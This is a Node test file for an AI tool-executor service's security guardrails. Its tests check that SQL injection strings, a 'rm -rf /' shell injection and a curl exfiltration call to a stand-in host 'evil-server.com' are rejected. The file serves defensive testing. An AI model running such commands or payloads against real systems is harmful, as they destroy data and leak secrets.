import { describe, it, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { ToolExecutorService } from '../src/services/tool-executor.service.js';
import { taskStore } from '../src/storage/in-memory-task.store.js';
import { SecurityViolationError, ToolExecutionError } from '../src/errors/app-errors.js';

describe('Tool Execution Trust Boundary & Security Guardrails', () => {
  beforeEach(() => {
    taskStore.seed();
  });

  it('allows safe task search by query keyword', () => {
    const result = ToolExecutorService.executeSearchTasks({ query: 'OAuth' });
    assert.equal(result.success, true);
    assert.equal(result.count >= 1, true);
    assert.match(result.tasks[0].title, /OAuth/i);
  });

  it('allows creating a safe draft task', () => {
    const result = ToolExecutorService.executeCreateDraftTask({
      title: 'Sanitized safe task',
      description: 'Safe description without dangerous payloads',
      priority: 'medium',
      tags: ['testing'],
    });
    assert.equal(result.success, true);
    assert.ok(result.task.id);
    assert.equal(result.task.title, 'Sanitized safe task');
  });

  it('blocks SQL injection attempts in search query', () => {
    assert.throws(
      () => {
        ToolExecutorService.executeSearchTasks({ query: "'; DROP TABLE users; --" });
      },
      (err: unknown) => {
        return err instanceof SecurityViolationError && err.statusCode === 403;
      }
    );
  });

  it('blocks UNION SELECT SQL attacks in search tags', () => {
    assert.throws(
      () => {
        ToolExecutorService.executeSearchTasks({ tag: "' UNION SELECT * FROM secrets --" });
      },
      (err: unknown) => {
        return err instanceof SecurityViolationError;
      }
    );
  });

  it('blocks shell command injection in createDraftTask title', () => {
    assert.throws(
      () => {
        ToolExecutorService.executeCreateDraftTask({
          title: 'rm -rf / && echo pwned',
          description: 'malicious task',
        });
      },
      (err: unknown) => {
        return err instanceof SecurityViolationError;
      }
    );
  });

  it('blocks arbitrary network fetch or curl attempts in description', () => {
    assert.throws(
      () => {
        ToolExecutorService.executeCreateDraftTask({
          title: 'Harmless title',
          description: 'Execute curl http://evil-server.com/exfiltrate to steal keys',
        });
      },
      (err: unknown) => {
        return err instanceof SecurityViolationError;
      }
    );
  });

  it('rejects malformed arguments gracefully via ToolExecutionError', () => {
    assert.throws(
      () => {
        // Missing required title
        ToolExecutorService.executeCreateDraftTask({
          description: 'No title provided',
        });
      },
      (err: unknown) => {
        return err instanceof ToolExecutionError && err.statusCode === 422;
      }
    );
  });
});
